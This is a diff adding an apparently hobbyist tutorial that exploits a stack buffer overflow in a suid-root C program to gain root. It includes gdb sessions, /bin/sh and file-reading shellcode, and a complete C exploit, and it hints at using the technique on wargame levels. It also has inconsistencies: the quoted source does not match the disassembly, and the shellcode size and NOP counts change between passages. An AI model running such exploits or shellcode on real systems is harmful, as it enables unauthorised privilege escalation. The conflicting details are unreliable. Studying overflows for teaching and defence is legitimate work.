@@ -1,0 +1,336 @@
+ **********************************************************************
+ *                                                                    *
+ *   This is a simple demonstration of buffer overflow exploitation   *
+ *                                                                    *
+ **********************************************************************
+
+There is a suid root binary in my home directory, that i'm going to exploit to get root.
+I start by creating a directory in /tmp so I have write access, and can get a core dump.
+
+l3thal@pandora:~/code/examples$ ls -al vuln
+-r-sr-x--- 1 root l3thal 6274 2010-01-19 18:08 vuln
+
+Here the suid bit is set so that the program is running with root privileges,
+but its owned by group l3thal and set executable by group also.
+For those of you that don't understand UNIX file permissions, I will break this down
+for you.
+
+  U   G   O         U = User G = Group O = Others
+ ---|---|---
+ r-s r-x --- 1 root l3thal 6274 2010-01-19 18:08 vuln
+
+ readable and executable (SUID) by User (root)
+ readable and executable by Group (l3thal)
+
+
+
+l3thal@pandora:/tmp$ mkdir moo && cd moo
+
+Now just copy the vuln program, and source here.
+
+l3thal@pandora:/tmp/moo$ cp ~/code/examples/vuln* .
+l3thal@pandora:/tmp/moo$ ls -l vuln
+-r-xr-x--- 1 l3thal l3thal 6274 2010-01-19 18:10 vuln
+
+When I copied the file the suid bit is lost and it is owned by l3thal,
+so after I figure out exactly what i need to do to exploit it, I will change the filename in my code to execute the one running with elevated privileges.
+
+l3thal@pandora:/tmp/moo$ cat vuln.c
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+/* if theres no argument, exit */
+
+    if(!argv[1]) {
+        return 0;
+    }
+
+ /* copy the first argument into a 256 byte buffer */
+
+    char buffer[256];
+    strcpy(buffer, argv[1]);
+    return 0;
+}
+
+It's a 256 byte buffer, but I need to know exactly how many bytes it will take to hit eip.
+We can determine that by the distance between the buffer and eip.
+
+l3thal@pandora:/tmp/moo$ gdb -q ./vuln
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x080483f4 <main+0>:    push   ebp
+0x080483f5 <main+1>:    mov    ebp,esp
+0x080483f7 <main+3>:    sub    esp,0x118
+0x080483fd <main+9>:    and    esp,0xfffffff0
+0x08048400 <main+12>:   mov    eax,0x0
+0x08048405 <main+17>:   sub    esp,eax
+0x08048407 <main+19>:   cmp    DWORD PTR [ebp+0x8],0x1
+0x0804840b <main+23>:   jne    0x804842e <main+58>
+0x0804840d <main+25>:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048410 <main+28>:   mov    eax,DWORD PTR [eax]
+0x08048412 <main+30>:   mov    DWORD PTR [esp+0x4],eax
+0x08048416 <main+34>:   mov    DWORD PTR [esp],0x8048574
+0x0804841d <main+41>:   call   0x80482f8 <printf@plt>
+0x08048422 <main+46>:   mov    DWORD PTR [esp],0x0
+0x08048429 <main+53>:   call   0x8048308 <exit@plt>
+0x0804842e <main+58>:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048431 <main+61>:   add    eax,0x4
+0x08048434 <main+64>:   mov    eax,DWORD PTR [eax]
+0x08048436 <main+66>:   mov    DWORD PTR [esp+0x4],eax
+0x0804843a <main+70>:   lea    eax,[ebp-0x108]
+0x08048440 <main+76>:   mov    DWORD PTR [esp],eax
+0x08048443 <main+79>:   call   0x8048318 <strcpy@plt>
+0x08048448 <main+84>:   lea    eax,[ebp-0x108]
+0x0804844e <main+90>:   mov    DWORD PTR [esp+0x4],eax
+0x08048452 <main+94>:   mov    DWORD PTR [esp],0x8048585
+0x08048459 <main+101>:  call   0x80482f8 <printf@plt>
+0x0804845e <main+106>:  leave  
+0x0804845f <main+107>:  ret    
+End of assembler dump.
+(gdb) 
+
+Set a breakpoint after strcpy so we can find our buffer.
+Then run the program with just enough A's so we can see it clearly
+
+(gdb) break *main+84
+Breakpoint 1 at 0x8048448
+(gdb) run AAAAAAAAAAAAAAAA
+Starting program: /tmp/moo/vuln AAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048448 in main ()
+
+Now take a look at the stack to find the start of the buffer
+
+(gdb) x/20x $esp-20
+0xbfffd7bc: 0x00a09100  0x08048460  0x08048330  0xbfffd8e8
+0xbfffd7cc: 0x08048448  0xbfffd7e0  0xbfffda83  0x00000001
+0xbfffd7dc: 0x0000085c  0x41414141  0x41414141  0x41414141
+0xbfffd7ec: 0x41414141  0x08048100  0x00000001  0x0085bff4
+0xbfffd7fc: 0xf63d4e2e  0x0085c820  0xbfffd8f0  0x0084a5cf
+
+(gdb) x/x 0xbfffd7dc+4
+0xbfffd7e0: 0x41414141
+
+Our buffer starts at 0xbfffd7e1. Let's find eip.
+
+(gdb) backtrace
+#0  0x08048448 in main ()
+(gdb) info frame 
+Stack frame at 0xbfffd8f0:
+ eip = 0x8048448 in main; saved eip 0x9ae455
+ Arglist at 0xbfffd8e8, args: 
+ Locals at 0xbfffd8e8, Previous frame's sp is 0xbfffd8f0
+ Saved registers:
+  ebp at 0xbfffd8e8, eip at 0xbfffd8ec
+(gdb) p 0xbfffd8ec - 0xbfffd7e0
+$2 = 268
+(gdb) q
+
+268 bytes from the start of the buffer to the start of eip.
+Add 4 bytes for the return address and we should have it.
+
+l3thal@pandora:/tmp/moo$ ./vuln `perl -e 'print "A"x268 . "\xef\xbe\xad\xde"'`
+Segmentation fault (core dumped)
+
+(if you dont get a core dump, try 'ulimit -c unlimited')
+
+l3thal@pandora:/tmp/moo$ gdb -c core.17916 -q
+Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
+Program terminated with signal 11, Segmentation fault.
+[New process 17916]
+#0  0xdeadbeef in ?? ()
+(gdb) i r               <= info registers
+eax            0x12c	300
+ecx            0x0	0
+edx            0x33b0f0	3387632
+ebx            0x339ff4	3383284
+esp            0xbfffd760	0xbfffd760
+ebp            0x41414141	0x41414141     <= our A's
+esi            0x8048460	134513760
+edi            0x8048330	134513456
+eip            0xdeadbeef	0xdeadbeef     <= saved return address is overwritten
+eflags         0x10292	[ AF SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0xc062007b	-1067319173
+fs             0x0	0
+gs             0x33	51
+(gdb) q
+
+Ok, the saved return address is overwritten so I know how long my string needs to be. 
+The shellcode I will use is 24 bytes, so 272 bytes was what i needed to overwrite the saved return 
+address, so 272 - 4 bytes for return address - 24 bytes for the shellcode = 244. 
+I'm gonna use nops (0x90) instead of A (0x41) so i can use point the return adress into
+the middle of the nops and hit my shellcode. I dont wanna be exact because when i change
+the filename from ./vuln to ~/code/examples/vuln to get the real program instead of the
+copy, the address will change slightly due to the length of the filename. This way the
+slight difference won't matter.
+
+So my overflow string will be ...
+        
+          [247 nops] [21 byte shellcode] [4 byte return address] 
+
+The return address needs to be little endian byte order 
+(x86 machines are little endian. sparc, ARM is big endian) 
+so if 0xdeadbeef was the return address, we would have to reverse it like so...
+
+          de ad be ef => ef be ad de => \xef\xbe\xad\xde
+
+l3thal@pandora:/tmp/moo$ ./vuln `perl -e 'print "\x90"x244 . "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "\xef\xbe\xad\xde"'`
+Segmentation fault (core dumped)
+l3thal@pandora:/tmp/moo$ gdb -c core.18313 -q
+Core was generated by `./vuln ����������������������������������������������������������������������'.
+Program terminated with signal 11, Segmentation fault.
+[New process 19914]
+0  0xdeadbeef in ?? () <= Perfect!
+
+I want to look through the stack and find my string of nops
+
+(gdb) x/10s $esp  
+0xbfffd780:	 ""
+0xbfffd781:	 ""
+0xbfffd782:	 ""
+0xbfffd783:	 ""
+0xbfffd784:	 "\004���\020���\210\020�"
+0xbfffd790:	 "\001"
+
+Here's the nops 
+
+0xbfffd8fc:	 '\220' <repeats 200 times>   <= nops
+0xbfffd9c4:	 '\220' <repeats 44 times>, "1�Ph//shh/bin\211�PS\211�\231�\v�\200BBBB"
+0xbfffda0d:	 "TERM=xterm"
+0xbfffda18:	 "SHELL=/bin/bash"
+0xbfffda28:	 "SSH_CLIENT=13.37.13.37 54097 22"
+0xbfffda4b:	 "SSH_TTY=/dev/pts/4"
+0xbfffda5e:	 "USER=vuln"
+
+I want to return somewhere in the middle of the nops so 0xbfffd9c4 should be fine.
+Lets change it to little endian byte order 
+
+    bf ff d9 c4 => c4 d9 ff bf => \xc4\xd9\xff\xbf
+
+l3thal@pandora:/tmp/moo$ ./vuln `perl -e 'print "\x90"x244 . "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "\xc4\xd9\xff\xbf"'`
+sh-3.2$ exit
+exit
+
+I got it, so lets change the filename so we get the privilege escalation
+
+l3thal@pandora:/tmp/moo$ ~/code/examples/vuln `perl -e 'print "\x90"x244 . "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "\xc4\xd9\xff\xbf"'`
+
+sh-3.2# whoami;id
+root
+uid=1018(l3thal) gid=1018(l3thal) euid=0(root) groups=4(adm),1018(l3thal) 
+sh-3.2# zing!
+
+I'm still uid/gid l3thal but the euid ("effective" uid) is 0(root), so I have root privileges.
+Now say it wasnt root but level5 and you were level4 (*hint*) you would get something like this and 
+level5 privileges 
+
+sh-3.2$ whoami;id
+level5
+uid=1006(level4) gid=1006(level4) euid=1007(level5) groups=1006(level4)
+sh-3.2$ zing!
+
+Now that I've got it all down, I can write a proper exploit. 
+While i'm at it, may as well have a little fun with this and write 
+some custom shellcode to cat the password file for me.
+
+I'll create a file just to test it out...
+
+l3thal@pandora:/tmp/moo$ echo "secret_password" > /pass/level4
+l3thal@pandora:/tmp/moo$ vi sh.asm
+section .text
+    global _start
+
+_start:
+    xor   eax, eax     ; zero eax
+    push  eax          ; null terminator
+    push  0x7461632f   ; /bin/cat
+    push  0x6e69622f   ;
+    mov   ebx, esp     ; pointer to /bin/cat0
+    push  eax          ; null
+    push  0x346c6576   ; /pass/level4
+    push  0x656c2f73   ; 
+    push  0x7361702f   ; 
+    mov   ecx, esp     ; pointer to /pass/level40
+    push  eax          ; null
+    push  ecx          ; pointer to file
+    push  ebx          ; pointer to cat
+    mov   ecx, esp     ; move it to ecx
+    mov   al, 11       ; execve syscall
+    int   80h          ; call the kernel
+
+now compile it and check out the opcodes.
+
+(on an x86_64 system you would need to comile it with
+"nasm -f elf32 sh.asm" and "ld -melf_i386 -o sh sh.o")
+
+l3thal@pandora:/tmp/moo$ nasm -f elf sh.asm
+l3thal@pandora:/tmp/moo$ ld -o sh sh.o
+l3thal@pandora:/tmp/moo$ objdump -M intel-mnemonics -d sh.o
+
+sh.o:     file format elf32-i386
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:   31 c0                   xor    eax,eax
+   2:   50                      push   eax
+   3:   68 2f 63 61 74          push   0x7461632f
+   8:   68 2f 62 69 6e          push   0x6e69622f
+   d:   89 e3                   mov    ebx,esp
+   f:   50                      push   eax
+  10:   68 76 65 6c 34          push   0x346c6576
+  15:   68 73 2f 6c 65          push   0x656c2f73
+  1a:   68 2f 70 61 73          push   0x7361702f
+  1f:   89 e1                   mov    ecx,esp
+  21:   50                      push   eax
+  22:   51                      push   ecx
+  23:   53                      push   ebx
+  24:   89 e1                   mov    ecx,esp
+  26:   b0 0b                   mov    al,0xb
+  28:   cd 80                   int    0x80
+
+no nullbytes, so let's grab the opcodes 
+
+l3thal@pandora:/tmp/moo$ objdump -d ./sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x76\x65\x6c\x34\x68\x73\x2f\x6c\x65\x68\x2f\x70\x61\x73\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+now the exploit...
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+#define NOP 0x90
+
+int main(void) {
+
+    // the shellcode is 42 bytes
+    char shell[] = "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x76\x65\x6c\x34\x68\x73\x2f\x6c\x65\x68\x2f\x70\x61\x73\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+    // buffer for the string
+    char payload[272];
+
+    // return address
+    char *ret = "\xc4\xd9\xff\xbf";
+
+    // copy nops, shellcode, and return address to buffer
+    memset(payload, NOP, 226);
+    memcpy(payload+226, shell, strlen(shell));
+    memcpy(payload+268, ret, strlen(ret));
+
+    // execute the vulnerable program with the payload
+    execl("./vuln","vuln", payload, 0);
+    return 0;
+}
+
+l3thal@pandora:/tmp/moo$ gcc sploit.c -o sploit
+l3thal@pandora:/tmp/moo$ ./sploit
+secret_password
+l3thal@pandora:/tmp/moo$ ;D zing!
